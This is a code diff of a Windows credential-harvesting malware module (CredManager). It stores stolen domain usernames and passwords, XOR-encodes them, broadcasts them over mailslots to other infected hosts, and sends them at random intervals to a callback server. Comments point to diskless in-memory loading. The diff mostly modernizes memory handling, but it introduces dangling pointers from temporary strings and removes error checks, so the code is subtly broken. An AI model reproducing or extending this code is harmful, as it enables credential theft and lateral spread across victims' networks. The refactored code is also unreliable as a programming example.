@@ -9,12 +9,16 @@
 */
 
 #include <Windows.h>
+#include <memory>
+#include <vector>
+#include <string>
+
 #include "dbg.h"
 #include "CredManager.h"
 
 #ifdef ROUTINES_BY_PTR
 
-CredManager_ptrs CredManager_apis;  // global var for transparent name translation into call-by-pointer  
+CredManager_ptrs CredManager_apis;    // global var for transparent name translation into call-by-pointer    
 
 // should be called before any other apis used to fill internal structures
 VOID CredManager_resolve(CredManager_ptrs *apis)
@@ -39,11 +43,13 @@ VOID CredManager_resolve(CredManager_ptrs *apis)
 #include "..\shared\CommStructures.h"
 
 // internal globals
-BOOL g_cmInitDone = FALSE;  // set to TRUE when internal init was already performed
-BOOL g_bcmBroadcasterStarted = FALSE;  // set when broadcasting routines are running
-CRITICAL_SECTION g_csListAccess;  // guard to access linked list
-CRED_LIST_CHUNK g_clHead;  // singly linked list's head
-SIZE_T g_lclItemCount;  // amount of items saved in ^
+BOOL g_cmInitDone = FALSE;    // set to TRUE when internal init was already performed
+
+BOOL g_bcmBroadcasterStarted = FALSE;    // set when broadcasting routines are running
+
+CRITICAL_SECTION g_csListAccess;    // guard to access linked list
+CRED_LIST_CHUNK    g_clHead;            // singly linked list's head
+SIZE_T            g_lclItemCount;        // amount of items saved in ^
 
 /*
     Fill passed structure with ptrs to all exported functions
@@ -61,16 +67,18 @@ VOID CredManager_imports(CredManager_ptrs *apis)
 BOOL _cmCheckInitInternals()
 {
     if (!g_cmInitDone) {
+
         DbgPrint("performing init");
+
         InitializeCriticalSection(&g_csListAccess);
         g_lclItemCount = 0;
         g_clHead = { 0 };
+
         // set init done flag
         g_cmInitDone = TRUE;
         return TRUE;
-    } else {
-        return FALSE;
-    }
+
+    } else { /*DbgPrint("already initialized");*/ return FALSE; }
 }
 
 // adds a record after all uniq checks are done
@@ -80,6 +88,7 @@ VOID _cmChainAddChunk(CRED_LIST_CHUNK *newchunk)
 {
     newchunk->lcNext = g_clHead.lcNext;
     g_clHead.lcNext = newchunk;
+
     g_lclItemCount++;
 }
 
@@ -88,32 +97,38 @@ VOID _cmChainAddChunk(CRED_LIST_CHUNK *newchunk)
 // NB: caller should already hold cs lock on list
 BOOL _cmChainRemoveChunk(CRED_LIST_CHUNK *delchunk)
 {
-    BOOL bRes = FALSE;  // function result
-    CRED_LIST_CHUNK *cur;  // current chunk in enum procedure
-    CRED_LIST_CHUNK *prev = NULL;  // chunk, previous for delchunk, determined using re-scan
+    BOOL bRes = FALSE;    // function result
+    CRED_LIST_CHUNK *cur;    // current chunk in enum procedure
+    CRED_LIST_CHUNK *prev = NULL;    // chunk, previous for delchunk, determined using re-scan
 
     if (!g_lclItemCount) { DbgPrint("ERR: chain is empty"); return FALSE; }
     if (!delchunk) { DbgPrint("ERR: NULL ptr passed"); return FALSE; }
+
+    DbgPrint("removing chunk at %p", delchunk);
 
     // set first item
     cur = g_clHead.lcNext;
 
     // enum chain to find ptr to delchunk, detecting it's prev item
     while (cur) {
+
         // check if found
         if (cur->lcNext == delchunk) { prev = cur;  break; }
+
         // move to next item
         cur = cur->lcNext;
-    }
+
+    } // while !NULL ptr
 
     // check if this item was found
     if (!prev) { DbgPrint("ERR: prev chunk not found for delchunk"); return FALSE; }
 
     // change pointers to exclude chunk from chain
+    DbgPrint("prev chunk %04Xh: changing next ptr from %04Xh to %04Xh", prev, prev->lcNext, delchunk->lcNext);
     prev->lcNext = delchunk->lcNext;
     g_lclItemCount--;
 
-    // free item
+    DbgPrint("deallocating chunk at %04Xh", delchunk);
     my_free(delchunk);
 
     // func res
@@ -124,23 +139,30 @@ BOOL _cmChainRemoveChunk(CRED_LIST_CHUNK *delchunk)
 // to stop enum, callback should return FALSE
 VOID _cmEnumRecords(CM_ENUM_CALLBACK cbCallback, LPVOID pCallbackParams)
 {
-    CRED_LIST_CHUNK *cur;  // current chunk in enum procedure
-    CRED_LIST_CHUNK *next;  // next chunk, because cur may be removed/deallocated
+    CRED_LIST_CHUNK *cur;    // current chunk in enum procedure
+    CRED_LIST_CHUNK *next;    // next chunk, because cur may be removed/deallocated
 
     if (!g_lclItemCount) { DbgPrint("WARN: no records, exiting"); return; }
 
     EnterCriticalSection(&g_csListAccess);
     __try {
+
         // NB: callback may perform removal (unlink) of chain item, so take care!
         cur = g_clHead.lcNext;
+
         while (cur) {
+
             // get next item to be used
             next = cur->lcNext;
+
             // invoke callback
             if (!cbCallback(cur, pCallbackParams)) { break; }
+
             // go to next ptr using previously saved next value, because cur may be deallocated by cbCallback
             cur = next;
+
         }
+
     } __except (1) { DbgPrint("ERR: exception catched"); }
     LeaveCriticalSection(&g_csListAccess);
 }
@@ -148,14 +170,16 @@ VOID _cmEnumRecords(CM_ENUM_CALLBACK cbCallback, LPVOID pCallbackParams)
 // callback invoked by _cmChainContainsChunk()
 BOOL CALLBACK _cmcbChainContains(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
 {
-    BOOL bRes = TRUE;  // continue enum by default
+    BOOL bRes = TRUE;    // continue enum by default
     CCC_CALLBACK_PARAMS *ccc = (CCC_CALLBACK_PARAMS *)pCallbackParams;
 
     // check for match
     if (chunk == ccc->check_ptr) { 
+        
         bRes = FALSE;
         ccc->bFound = TRUE;
-    }
+
+    } // matching ptrs
 
     return bRes;
 }
@@ -166,7 +190,7 @@ BOOL CALLBACK _cmcbChainContains(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
 // Needed to avoid IsBadWritePtr() and seh, which not working as expected on some platforms when image is loaded disklessly
 BOOL _cmChainContainsChunk(CRED_LIST_CHUNK *chk_chunk_ptr)
 {
-    BOOL bRes = FALSE;  // func result by default
+    BOOL bRes = FALSE;    // func result by default
     CCC_CALLBACK_PARAMS ccc = { 0 };
 
     // prepare params to be passed
@@ -184,11 +208,11 @@ BOOL _cmChainContainsChunk(CRED_LIST_CHUNK *chk_chunk_ptr)
 // encodes passed binary value into ENC_BUFFER structure
 BOOL cmebEncode(LPVOID pBinaryData, DWORD dwDataLen, ENC_BUFFER *eb)
 {
-    BOOL bRes = FALSE;  // func result
+    BOOL bRes = FALSE;    // func result
     RndClass rg = { 0 }; // random number generator pseudo-object
-    DWORD dwKey1, dwKey2;  // random values for encoding
-    DWORD dwCounter = dwDataLen;  // loop counter 
-    BYTE *pIn, *pOut;  // in and out buffer's ptrs
+    DWORD dwKey1, dwKey2;    // random values for encoding
+    DWORD dwCounter = dwDataLen;    // loop counter 
+    BYTE *pIn, *pOut;    // in and out buffer's ptrs
 
     // dbg size check
 #ifdef _DEBUG
@@ -205,7 +229,7 @@ BOOL cmebEncode(LPVOID pBinaryData, DWORD dwDataLen, ENC_BUFFER *eb)
 
     // get ptrs
     pIn = (BYTE *)pBinaryData;
-    pOut = (BYTE *)&eb->bEncBuffer[0];  //NB: first 2 DWORDs are for encoding keys
+    pOut = (BYTE *)&eb->bEncBuffer[0];    //NB: first 2 DWORDs are for encoding keys
 
     // save keys
     memcpy(pOut, &dwKey1, sizeof(DWORD)); pOut += sizeof(DWORD);
@@ -213,19 +237,23 @@ BOOL cmebEncode(LPVOID pBinaryData, DWORD dwDataLen, ENC_BUFFER *eb)
 
     // proceed
     while (dwCounter) {
+
         // gen out byte
         *pOut = *pIn ^ (BYTE)dwKey1 ^ (BYTE)dwKey2;
+
         // cycle keys, in different directions
         dwKey1 = ROL32(dwKey1, 3);
         dwKey2 = ROR32(dwKey2, 2);
+
         // move ptrs
         dwCounter--;
         pIn++;
         pOut++;
-    }
+
+    } // while dwCounter
 
     // set enc buffer's size
-    eb->bEncBufferLen = (BYTE)(dwDataLen + (sizeof(DWORD) * 2));
+    eb->bEncBufferLen = (BYTE)( dwDataLen + (sizeof(DWORD) * 2) );
 
     bRes = TRUE;
 
@@ -235,20 +263,13 @@ BOOL cmebEncode(LPVOID pBinaryData, DWORD dwDataLen, ENC_BUFFER *eb)
 // wrapper for cmebEncode()
 BOOL cmebEncodeW(LPWSTR wszData, ENC_BUFFER *eb)
 {
-    BOOL bRes;  // function result
-    LPSTR szutf8_Buffer;  // utf8 encoding buffer
-    int iBufferLen;  // len of ^ buffer
-    int iBytesWritten;  // amount of bytes written to utf-8 buffer
+    BOOL bRes;    // function result
+    std::string utf8Str;
+    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wszData, -1, nullptr, 0, NULL, NULL);
+    utf8Str.resize(utf8Len);
+    WideCharToMultiByte(CP_UTF8, 0, wszData, -1, &utf8Str[0], utf8Len, NULL, NULL);
 
-    // translate string into UTF-8
-    iBufferLen = lstrlenW(wszData) * 4;
-    szutf8_Buffer = (LPSTR)my_alloc(iBufferLen);
-    iBytesWritten = WideCharToMultiByte(CP_UTF8, 0, wszData, -1, szutf8_Buffer, iBufferLen, NULL, NULL);
-
-    bRes = cmebEncode(szutf8_Buffer, iBytesWritten, eb);
-
-    // free mem used
-    my_free(szutf8_Buffer);
+    bRes = cmebEncode((LPVOID)utf8Str.data(), utf8Len, eb);
 
     return bRes;
 }
@@ -257,18 +278,19 @@ BOOL cmebEncodeW(LPWSTR wszData, ENC_BUFFER *eb)
 // NB: caller responsible for allocating sufficient buffer and supplying valid structures
 BOOL cmebDecode(ENC_BUFFER *eb, LPVOID pOutBuffer, DWORD *dwOutLen)
 {
-    BOOL bRes = FALSE;  // func result
-    DWORD dwCounter = eb->bEncBufferLen - (sizeof(DWORD)*2);  // loop counter 
-    BYTE *pIn, *pOut;  // in and out buffer's ptrs
-    DWORD dwKey1, dwKey2;  // encoding keys at buffer
-    DWORD *dwP = (DWORD *)eb->bEncBuffer;  // to ease key dwords access
+    BOOL bRes = FALSE;    // func result
+    DWORD dwCounter = eb->bEncBufferLen - (sizeof(DWORD)*2);    // loop counter 
+    BYTE *pIn, *pOut;    // in and out buffer's ptrs
+    DWORD dwKey1, dwKey2;    // encoding keys at buffer
+
+    DWORD *dwP = (DWORD *)eb->bEncBuffer;    // to ease key dwords access
 
     // get keys
-    dwKey1 = *dwP;  dwP++;
+    dwKey1 = *dwP;    dwP++;
     dwKey2 = *dwP;
 
     // set ptrs
-    pIn = (BYTE *)&eb->bEncBuffer[0]; pIn += sizeof(DWORD) * 2;  // pass by keys
+    pIn = (BYTE *)&eb->bEncBuffer[0]; pIn += sizeof(DWORD) * 2;    // pass by keys
     pOut = (BYTE *)pOutBuffer;
 
     // save resulting len
@@ -276,69 +298,67 @@ BOOL cmebDecode(ENC_BUFFER *eb, LPVOID pOutBuffer, DWORD *dwOutLen)
 
     // do working loop
     while (dwCounter) {
+
         // gen out byte
         *pOut = *pIn ^ (BYTE)dwKey1 ^ (BYTE)dwKey2;
+
         // cycle keys, in different directions
         dwKey1 = ROL32(dwKey1, 3);
         dwKey2 = ROR32(dwKey2, 2);
+
         // move ptrs
         dwCounter--;
         pIn++;
         pOut++;
-    }
+
+    } // dwCounter
 
     bRes = TRUE;
 
     return bRes;
 }
 
-// wrapper for cmebDecode which allocates buffer and passes it to caller
-// NB: caller should deallocated buffer itself, if returned
-// NB2: returns NULL on decode error
-LPWSTR cmebDecodeW(ENC_BUFFER *eb)
+/*
+    wrapper for cmebDecode which allocates buffer and passes it to caller
+    NB: caller should deallocated buffer itself, if returned
+    NB2: returns NULL on decode error
+*/
+std::wstring cmebDecodeW(ENC_BUFFER *eb)
 {
-    LPSTR szUtf8 = NULL;  
+    std::string utf8Str;
     DWORD dwLen = 0;
-    LPWSTR wszAnsi = NULL;  // resulting ansi buffer
-    int iBufferLen;  // len of buffer to be used
+    std::wstring ansiStr;
 
-    do { // not a loop
-        iBufferLen = eb->bEncBufferLen * 4;
-        szUtf8 = (LPSTR)my_alloc(iBufferLen);  // extra sufficient buffer
+    utf8Str.resize(eb->bEncBufferLen * 4);
 
-        // do decoding of string
-        if (!cmebDecode(eb, szUtf8, &dwLen)) {
-            DbgPrint("ERR: decode failed");
-            break;
-        }
+    // do decoding of string
+    if (!cmebDecode(eb, &utf8Str[0], &dwLen)) {
+        DbgPrint("ERR: decode failed");
+        return L"";
+    }
 
-        // translate from utf-8 to ansi utf-16 codepage
-        wszAnsi = (LPWSTR)my_alloc(iBufferLen);
-        if (!MultiByteToWideChar(CP_UTF8, 0, szUtf8, dwLen, wszAnsi, iBufferLen / 2)) {
-            DbgPrint("ERR: MultiByteToWideChar() failed while converting from utf-8 into ansi, le %p", GetLastError());
-            my_free(wszAnsi);
-            wszAnsi = NULL;
-        }
-    } while (FALSE);  // not a loop
+    // translate from utf-8 to ansi utf-16 codepage
+    int ansiLen = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), dwLen, nullptr, 0);
+    ansiStr.resize(ansiLen);
+    MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), dwLen, &ansiStr[0], ansiLen);
 
-    // free buffers
-    if (szUtf8) { my_free(szUtf8); }
-
-    return wszAnsi;
+    return ansiStr;
 }
 
 // callback invoked at thrcmCredBroadcaster() to select a chunk with 0 or minimum dwLastSentTicks
 // in order to send newer records
 BOOL CALLBACK _cmcbSelectMinLastSent(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
 {
-    BOOL bRes = TRUE;  // continue enum by default
+    BOOL bRes = TRUE;    // continue enum by default
     TCB_CALLBACK_PARAMS *tcp = (TCB_CALLBACK_PARAMS *)pCallbackParams;
 
     // check if we have a lower value OR it's the first call
-    if ((chunk->cr.dwLastSentTicks < tcp->chunk.cr.dwLastSentTicks) || (!tcp->orig_chunk_ptr)) {
+    if ( (chunk->cr.dwLastSentTicks < tcp->chunk.cr.dwLastSentTicks) || (!tcp->orig_chunk_ptr)) {
+
         // save ptr and structure's values
         tcp->orig_chunk_ptr = chunk;
         tcp->chunk = *chunk;
+
     }
 
     // in case of zero value catched - stop enum
@@ -351,8 +371,10 @@ BOOL CALLBACK _cmcbSelectMinLastSent(CRED_LIST_CHUNK *chunk, LPVOID pCallbackPar
 LARGE_INTEGER __ft2li(FILETIME ft)
 {
     LARGE_INTEGER res;
+
     res.LowPart = ft.dwLowDateTime;
     res.HighPart = ft.dwHighDateTime;
+
     return res;
 }
 
@@ -360,8 +382,10 @@ LARGE_INTEGER __ft2li(FILETIME ft)
 FILETIME __li2ft(LARGE_INTEGER li)
 {
     FILETIME res;
+
     res.dwLowDateTime = li.LowPart;
     res.dwHighDateTime = li.HighPart;
+
     return res;
 }
 
@@ -370,61 +394,60 @@ FILETIME __li2ft(LARGE_INTEGER li)
 // returns TRUE when data is accepted and processed
 BOOL CALLBACK cmMailslotBroadcastInProcessingDataCallback(DISPATCHER_CALLBACK_PARAMS *dcp)
 {
-    BOOL bRes = FALSE;  // by default, tell we were unable to process data, and let it go to other registered callbacks
-    SERIALIZED_CREDS_BUFFER *scb;  // ptr to data in a newly allocated buffer
-    ADD_CREDS_RECORD acr = { 0 };  // input for cmAddCredentials() call
-    ENC_BUFFER eb;  // flat structure with encoded data
-    BYTE *pPtr;  // moving ptr
+    BOOL bRes = FALSE;    // by default, tell we were unable to process data, and let it go to other registered callbacks
+    std::unique_ptr<SERIALIZED_CREDS_BUFFER> scb;    // ptr to data in a newly allocated buffer
+    ADD_CREDS_RECORD acr = { 0 };    // input for cmAddCredentials() call
+    ENC_BUFFER eb;    // flat structure with encoded data
+    BYTE *pPtr;    // moving ptr
 
     // check for mailslot source with MMI_CREDENTIALS id from header
     if ((dcp->csType == ST_MAILSLOT) && (dcp->lInBufferLen < 424) && (dcp->lInBufferLen > sizeof(SERIALIZED_CREDS_BUFFER)) && (dcp->bInputMessageId == MMI_CREDENTIALS)) {
+
         // copy data into internal buffer 
-        scb = (SERIALIZED_CREDS_BUFFER *)my_alloc(dcp->lInBufferLen);
-        memcpy(scb, dcp->pInBuffer, dcp->lInBufferLen);
+        scb.reset((SERIALIZED_CREDS_BUFFER *)my_alloc(dcp->lInBufferLen));
+        memcpy(scb.get(), dcp->pInBuffer, dcp->lInBufferLen);
 
         // dexor
-        _cmDoXor(scb->dwRandomKey1, scb->dwRandomKey2, (LPVOID)((SIZE_T)scb + (sizeof(DWORD) * 2)), dcp->lInBufferLen - (sizeof(DWORD) * 2));
+        _cmDoXor(scb->dwRandomKey1, scb->dwRandomKey2, (LPVOID)((SIZE_T)scb.get() + (sizeof(DWORD) * 2)), dcp->lInBufferLen - (sizeof(DWORD) * 2));
 
         // check length
         if (sizeof(SERIALIZED_CREDS_BUFFER) + scb->blen_SourceMachineName + scb->blen_Domain + scb->blen_Username + scb->blen_Password == dcp->lInBufferLen) {
+
             do { // not a loop
+
                 // check ok, do deserialization and fill api structure
                 acr.dwLen = sizeof(ADD_CREDS_RECORD);
                 // enc_buffers order
                 // <SourceMachineName><Domain><Username><Password>
-                pPtr = (BYTE *)((SIZE_T)scb + sizeof(SERIALIZED_CREDS_BUFFER));  // ptr to start of varfields
-                eb.bEncBufferLen = scb->blen_SourceMachineName;  memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
-                if (!(acr.wszSourceMachineName = cmebDecodeW(&eb))) { DbgPrint("ERR: wszSourceMachineName decode failed"); break; }
+                pPtr = (BYTE *)((SIZE_T)scb.get() + sizeof(SERIALIZED_CREDS_BUFFER));    // ptr to start of varfields
+                eb.bEncBufferLen = scb->blen_SourceMachineName;        memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
+                acr.wszSourceMachineName = cmebDecodeW(&eb).c_str();
 
-                eb.bEncBufferLen = scb->blen_Domain;  memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
-                if (!(acr.wszDomain = cmebDecodeW(&eb))) { DbgPrint("ERR: wszDomain decode failed"); break; }
+                eb.bEncBufferLen = scb->blen_Domain;    memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
+                acr.wszDomain = cmebDecodeW(&eb).c_str();
 
-                eb.bEncBufferLen = scb->blen_Username;  memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
-                if (!(acr.wszUsername = cmebDecodeW(&eb))) { DbgPrint("ERR: wszUsername decode failed"); break; }
+                eb.bEncBufferLen = scb->blen_Username;    memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen); pPtr += eb.bEncBufferLen;
+                acr.wszUsername = cmebDecodeW(&eb).c_str();
 
                 eb.bEncBufferLen = scb->blen_Password; memcpy(eb.bEncBuffer, pPtr, eb.bEncBufferLen);
-                if (!(acr.wszPassword = cmebDecodeW(&eb))) { DbgPrint("ERR: wszPassword decode failed"); break; }
+                acr.wszPassword = cmebDecodeW(&eb).c_str();
 
                 acr.coOrigin = CRED_ORIGIN_NETWORK;
                 acr.coOrigin2 = (ENUM_CRED_ORIGIN)scb->bOrigin2;
+
                 acr.bAccessLevel = scb->bAccessLevel;
+
                 acr.ftReceived = cmftNow();
                 acr.ftGathered = __li2ft(scb->liGatheredStamp);
 
                 // do add, with auto uniq check
-                if (cmAddCredentials(&acr)) { bRes = TRUE; }
-            } while (FALSE);  // not a loop
+                if (cmAddCredentials(&acr)) { DbgPrint("cmAddCredentials() OK, nice creds added"); bRes = TRUE; }
 
-            // free buffs
-            if (acr.wszPassword) { my_free(acr.wszPassword); }
-            if (acr.wszUsername) { my_free(acr.wszUsername); }
-            if (acr.wszDomain) { my_free(acr.wszDomain); }
-            if (acr.wszSourceMachineName) { my_free(acr.wszSourceMachineName); }
-        }
+            } while (FALSE);    // not a loop
 
-        // free used mem
-        my_free(scb);
-    }
+        } // check size
+
+    } // check size
 
     return bRes;
 }
@@ -442,15 +465,18 @@ BYTE inline _cmGetXorByte(UINT64 i64Key, BYTE bPos)
 */
 VOID _cmDoXor(DWORD dwKey1, DWORD dwKey2, LPVOID pBuffer, DWORD lBufferLen)
 {
-    UINT64 i64Key = ((UINT64)dwKey1 << 32) + dwKey2;  // for resulting key
+    UINT64 i64Key = ((UINT64)dwKey1 << 32) + dwKey2;    // for resulting key
     BYTE *pb = (BYTE *)pBuffer;
     DWORD dwCnt = 0;
 
     while (dwCnt < lBufferLen) {
-        *pb ^= _cmGetXorByte(i64Key, (dwCnt & 0x07));  // resulting range is [0..7]
+
+        *pb ^= _cmGetXorByte(i64Key, (dwCnt & 0x07));    // resulting range is [0..7]
+
         dwCnt++;
         pb++;
     }
+
 }
 
 // performs serialization/encoding of creds data buffer into pBuffer 
@@ -458,10 +484,11 @@ VOID _cmDoXor(DWORD dwKey1, DWORD dwKey2, LPVOID pBuffer, DWORD lBufferLen)
 // If CreateFile specifies a domain or uses the asterisk format to specify the system's primary domain, the application cannot write more than 424 bytes at a time to the mailslot.
 BOOL _cmSerializeCredData(CRED_LIST_CHUNK *chunk, LPVOID pBuffer, DWORD *dwLen)
 {
-    BOOL bRes = FALSE;  // function result
-    SERIALIZED_CREDS_BUFFER *scb = (SERIALIZED_CREDS_BUFFER *)pBuffer;  // do not access this until all check are performed
+    BOOL bRes = FALSE;    // function result
+    SERIALIZED_CREDS_BUFFER *scb = (SERIALIZED_CREDS_BUFFER *)pBuffer;    // do not access this until all check are performed
     RndClass rg = { 0 }; // random number generator pseudo-object
-    BYTE *pb;  // ptr where to write varlen fields, adjustable
+    BYTE *pb;    // ptr where to write varlen fields, adjustable
+
     DWORD dwNeededBufferLen;
 
     // check for params passed
@@ -485,6 +512,7 @@ BOOL _cmSerializeCredData(CRED_LIST_CHUNK *chunk, LPVOID pBuffer, DWORD *dwLen)
     // all checks done ok, use casted ptr
     scb->dwRandomKey1 = rg.rgGetRndDWORD(&rg);
     scb->dwRandomKey2 = rg.rgGetRndDWORD(&rg);
+
     scb->liGatheredStamp = __ft2li(chunk->cr.ftGathered);
     scb->bOrigin2 = (BYTE)chunk->cr.coOrigin2;
     scb->bAccessLevel = chunk->cr.bAccessLevel;
@@ -497,6 +525,7 @@ BOOL _cmSerializeCredData(CRED_LIST_CHUNK *chunk, LPVOID pBuffer, DWORD *dwLen)
 
     // now append encoded buffers moving ptr 
     pb = (BYTE *)((SIZE_T)scb + sizeof(SERIALIZED_CREDS_BUFFER));
+
     // order is <SourceMachineName><Domain><Username><Password>
     memcpy(pb, chunk->cr.ebSourceMachineName.bEncBuffer, chunk->cr.ebSourceMachineName.bEncBufferLen); pb += chunk->cr.ebSourceMachineName.bEncBufferLen;
     memcpy(pb, chunk->cr.ebDomain.bEncBuffer, chunk->cr.ebDomain.bEncBufferLen); pb += chunk->cr.ebDomain.bEncBufferLen;
@@ -515,21 +544,15 @@ BOOL _cmSerializeCredData(CRED_LIST_CHUNK *chunk, LPVOID pBuffer, DWORD *dwLen)
 // NB: this function receives a copy of chunk from thrcmCredBroadcaster()
 BOOL _cmBroadcastChunk(CRED_LIST_CHUNK *chunk)
 {
-    BOOL bRes = FALSE;  // func result
-    LPVOID pBroadcastBuffer;  // buffer to hold data to be sent, <400 bytes recommended
+    BOOL bRes = FALSE;    // func result
+    std::unique_ptr<BYTE[]> pBroadcastBuffer(new BYTE[1024]);    // buffer to hold data to be sent, <400 bytes recommended
     DWORD dwBroadcastBufferLen = 1024; // len of ^
 
-    // alloc mem
-    pBroadcastBuffer = my_alloc(1024);
-
     // call data converter/serializer
-    _cmSerializeCredData(chunk, pBroadcastBuffer, &dwBroadcastBufferLen);
+    _cmSerializeCredData(chunk, pBroadcastBuffer.get(), &dwBroadcastBufferLen);
 
     // do send
-    bRes = mwSendMailslotMessageToAllDomains(pBroadcastBuffer, dwBroadcastBufferLen, MMI_CREDENTIALS);
-
-    // free mem used
-    my_free(pBroadcastBuffer);
+    bRes = mwSendMailslotMessageToAllDomains(pBroadcastBuffer.get(), dwBroadcastBufferLen, MMI_CREDENTIALS);
 
     return bRes;
 }
@@ -539,33 +562,30 @@ BOOL _cmBroadcastChunk(CRED_LIST_CHUNK *chunk)
 // is constantly updated with a newer, more actual value)
 BOOL CALLBACK _cmcbSerializeAll(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
 {
-    BOOL bRes = TRUE;  // continue enum by default
-    MY_STREAM *myStream = (MY_STREAM *)pCallbackParams;  // passed param
-    LPVOID pBuffer = NULL;  // buffer to store a single serialization result
-    DWORD dwBufferLen = 1024;  // initial buffer size & amount of data returned from serialization function
+    BOOL bRes = TRUE;    // continue enum by default
+    MY_STREAM *myStream = (MY_STREAM *)pCallbackParams;    // passed param
+    std::unique_ptr<BYTE[]> pBuffer(new BYTE[1024]);    // buffer to store a single serialization result
+    DWORD dwBufferLen = 1024;    // initial buffer size & amount of data returned from serialization function
 
-    pBuffer = my_alloc(dwBufferLen);
+    if (!(_cmSerializeCredData(chunk, pBuffer.get(), &dwBufferLen))) { DbgPrint("WARN: failed to serialize"); } else {
 
-    if (!(_cmSerializeCredData(chunk, pBuffer, &dwBufferLen))) { DbgPrint("WARN: failed to serialize"); } else {
         // serialized ok, append to stream
-        myStream->msWriteStream(myStream, pBuffer, dwBufferLen);
+        myStream->msWriteStream(myStream, pBuffer.get(), dwBufferLen);
     }
-
-    // free mem used
-    my_free(pBuffer);
 
     return bRes;
 }
 
 /*
     Receives a buffer with all the creds serialized, prepared inner envelope and 
-    issue a ST_NETWORK_SEND with volatile tag assigned
+    issue a ST_NETWORK_SEND with volatile tag set
     NB: this does not guarantee a chunk is to be sent at the same moment
 */
 VOID _cmSendSerializedCredsBuffer(MY_STREAM *myStream)
 {
-    INNER_ENVELOPE *iEnvelope = NULL;  // inner envelope ptr to be used with data
-    DISPATCHER_CALLBACK_PARAMS dcp = { 0 };  // params structure to be sent to callback server
+    INNER_ENVELOPE *iEnvelope = NULL;    // inner envelope ptr to be used with data
+
+    DISPATCHER_CALLBACK_PARAMS dcp = { 0 };    // params structure to be sent to callback server
     CLIENTDISPATCHERFUNC pServingCallback = dcmGetServerCallback();
 
     if (!myStream->lDataLen) { DbgPrint("ERR: empty serialized buffer passed, exiting"); return; }
@@ -604,8 +624,10 @@ VOID _cmSendSerializedCredsBuffer(MY_STREAM *myStream)
 DWORD WINAPI thrcmCredBroadcaster(LPVOID lpParameter)
 {
     RndClass rg = { 0 }; // random number generator pseudo-object
-    TCB_CALLBACK_PARAMS tcp = { 0 };  // params structure to be passed to callback
-    MY_STREAM myStream = { 0 };  // stream pseudo-object for all creds serialization
+    TCB_CALLBACK_PARAMS tcp = { 0 };    // params structure to be passed to callback
+    MY_STREAM myStream = { 0 };    // stream pseudo-object for all creds serialization
+
+    DbgPrint("entered");
 
     // init rnd
     rgNew(&rg);
@@ -613,8 +635,10 @@ DWORD WINAPI thrcmCredBroadcaster(LPVOID lpParameter)
 
     // infinite working loop
     while (TRUE) {
+
         // check if anything is on the list
         if (g_lclItemCount) {
+
             // call cb which serializes all creds available and send it to a buffer to be sent to remote server
             msInitStream(&myStream);
             _cmEnumRecords(_cmcbSerializeAll, &myStream);
@@ -630,16 +654,23 @@ DWORD WINAPI thrcmCredBroadcaster(LPVOID lpParameter)
 
             // enter lock second time, to modify chunk's params
             EnterCriticalSection(&g_csListAccess);
+
             __try {
+
                 // check if saved ptr is still in the chain -> it is safe to use it
                 // we cannot just IsBadWritePtr() or seh it, because it may not work on in-mem load, especially in x64 target
                 if (_cmChainContainsChunk(tcp.orig_chunk_ptr)) {
+
                     // set broadcasting time via saved chunk's ptr
                     tcp.orig_chunk_ptr->cr.dwLastSentTicks = GetTickCount();
-                }
+
+                } // ptr still in the chunk
+
             } __except (1) { DbgPrint("WARN: exception catched"); }
+
             LeaveCriticalSection(&g_csListAccess);
-        }
+
+        } // g_lclItemCount
 
         // some random wait before making next step
 #ifdef _DEBUG
@@ -649,7 +680,8 @@ DWORD WINAPI thrcmCredBroadcaster(LPVOID lpParameter)
         // release - 20 - 650 s
         Sleep(rg.rgGetRnd(&rg, 2000, 15000));
 #endif
-    }
+
+    } // infinite working loop
 
     ExitThread(0);
 }
@@ -657,8 +689,10 @@ DWORD WINAPI thrcmCredBroadcaster(LPVOID lpParameter)
 // creates broadcaster thread which will send all items from internal list to network
 VOID cmStartupNetworkBroadcaster()
 {
-    HANDLE hThread;  // CreateThread()'s handle to be closed
+    HANDLE hThread;    // CreateThread()'s handle to be closed
     DWORD dwThreadId;
+
+    DbgPrint("entered");
 
     // check if a broadcaster was already started within current process
     if (g_bcmBroadcasterStarted) { DbgPrint("ERR: already started, exiting"); return; }
@@ -670,17 +704,20 @@ VOID cmStartupNetworkBroadcaster()
 
     // set flag
     g_bcmBroadcasterStarted = TRUE;
+
 }
 
 // returns TRUE if LARGE_INTEGER value ftA is greater than ftB
 // used to correctly compare UTC dates in FILETIME format
 BOOL _cmIsFileTimeGreater(FILETIME ftA, FILETIME ftB)
 {
-    LARGE_INTEGER liA, liB;  // as stated in msdn
+    
+    LARGE_INTEGER liA, liB;    // as stated in msdn
 
     // prepare locals
     liA.LowPart = ftA.dwLowDateTime;
     liA.HighPart = ftA.dwHighDateTime;
+
     liB.LowPart = ftB.dwLowDateTime;
     liB.HighPart = ftB.dwHighDateTime;
     
@@ -693,34 +730,42 @@ BOOL _cmIsFileTimeGreater(FILETIME ftA, FILETIME ftB)
 // called while holding cs lock, so it is safe to perform manipulations on chain
 BOOL CALLBACK _cmcbAddCredentialsEnum(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
 {
-    BOOL bRes = TRUE;  // continue enum by default
+    BOOL bRes = TRUE;    // continue enum by default
     AC_CALLBACK_PARAMS *acp = (AC_CALLBACK_PARAMS *)pCallbackParams;
 
     // check domain+username as primary key
     if (chunk->cr.i64DomainUsernameHash == acp->i64DomainUsernameHash) {
+
         // check if password same -> sure dup
         if (chunk->cr.i64PasswordHash == acp->i64PasswordHash) {
+            
             acp->bIsDuplicate = TRUE;
-            return FALSE;  // no enum needed anymore
-        }
+            return FALSE;    // no enum needed anymore
+
+        } // same passwords
 
